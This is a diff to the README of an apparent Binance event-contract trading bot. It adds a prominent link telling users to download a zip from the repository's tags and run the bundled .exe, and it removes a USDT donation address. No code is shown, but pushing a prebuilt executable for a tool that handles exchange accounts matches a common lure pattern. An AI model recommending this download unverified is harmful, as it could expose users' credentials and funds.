@@ -11,7 +11,16 @@
 
 ---
 
+## 📥 Download & Installation
+
+**[👉 Click here to download the latest Release (Pro Edition)](https://github.com/FocusMIke/Binance-Event-Contract-Test/tags)**
+
+*(Note: Download the `.zip` file from the latest tag, extract it into a new folder, and run the `.exe` directly. No Python environment required!)*
+
+---
+
 ## ⚠️ STRICT LEGAL DISCLAIMER (PLEASE READ)
+
 This software is an **OPEN-SOURCE** and **100% FREE** project. It is developed strictly for **scientific research, UI automation testing, and educational purposes ONLY**. 
 - It is **NOT** a commercial financial product.
 - It is **NOT** designed to provide financial advice or guarantee profits.
@@ -50,18 +59,3 @@ Set up an alert on TradingView and point the Webhook URL to your cloud server:
 In the **Message** box, strictly use the following JSON format:
 ```json
 {"side": "YES", "quantity": 1}
-
-## ☕ Support & Donation
-
-If you find this project helpful for your quantitative research or trading automation, consider buying the developer a coffee! Your support is highly appreciated and keeps this project 100% free, open-source, and actively maintained.
-
-**USDT (Tether)**
-* **Network:** BSC / BNB Smart Chain (BEP20)
-* **Address:** `0x8a086cf46675ab76e4cf4f4e06f5d91bac77831f`
-
-<img src="USDT_QR.png" width="200" alt="USDT BSC QR Code">
-
-*(⚠️ Note: Please ensure you select the strictly correct **BSC / BEP20** network when transferring, otherwise your funds may be permanently lost.)*
-
-
-https://github.com/FocusMIke/Binance-Event-Contract-Test/tags
